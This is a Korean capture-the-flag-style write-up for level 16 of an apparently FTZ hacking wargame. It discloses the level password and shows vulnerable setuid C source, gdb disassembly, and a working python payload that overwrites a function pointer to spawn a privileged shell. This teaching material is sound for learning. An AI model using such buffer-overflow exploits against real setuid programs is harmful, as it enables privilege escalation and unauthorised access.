---
sort: 16
---

# Level 16

```note
id : level16

password : about to cause mass
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 조져보자.

```c
#include <stdio.h>
 
void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```

함수포인터인 call에 저장되어있는 printit 함수 주소를 shell 함수 주소로 바꾸면 끝난다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x08048518 (main+0):	push   %ebp
0x08048519 (main+1):	mov    %esp,%ebp
0x0804851b (main+3):	sub    $0x38,%esp

<b>0x0804851e (main+6):	movl   $0x8048500,0xfffffff0(%ebp) </b>

0x08048525 (main+13):	sub    $0x4,%esp
0x08048528 (main+16):	pushl  0x80496e8
0x0804852e (main+22):	push   $0x30

<b>0x08048530 (main+24):	lea    0xffffffc8(%ebp),%eax
0x08048533 (main+27):	push   %eax
0x08048534 (main+28):	call   0x8048384 (fgets) </b>

0x08048539 (main+33):	add    $0x10,%esp

<b>0x0804853c (main+36):	mov    0xfffffff0(%ebp),%eax
0x0804853f (main+39):	call   *%eax </b>

0x08048541 (main+41):	leave  
0x08048542 (main+42):	ret


(gdb) disas shell
Dump of assembler code for function shell:
<b>0x080484d0 (shell+0):	push   %ebp </b>
0x080484d1 (shell+1):	mov    %esp,%ebp
0x080484d3 (shell+3):	sub    $0x8,%esp
0x080484d6 (shell+6):	sub    $0x8,%esp
0x080484d9 (shell+9):	push   $0xc19
0x080484de (shell+14):	push   $0xc19
0x080484e3 (shell+19):	call   0x80483b4 (setreuid)
0x080484e8 (shell+24):	add    $0x10,%esp
0x080484eb (shell+27):	sub    $0xc,%esp
0x080484ee (shell+30):	push   $0x80485b8
0x080484f3 (shell+35):	call   0x8048364 (system)
0x080484f8 (shell+40):	add    $0x10,%esp
0x080484fb (shell+43):	leave  
0x080484fc (shell+44):	ret    
0x080484fd (shell+45):	lea    0x0(%esi),%esi
</pre>

shell 함수 주소는 0x080484d0이다.

```bash
# padding 0x28 byte + 0x080484d0
[level16@ftz level16]$ (python -c "print('A'*0x28+'\xd0\x84\x04\x08\n')";cat) | ./attackme 
my-pass
```

```tip
## 알게 된 점

buffer overflow
```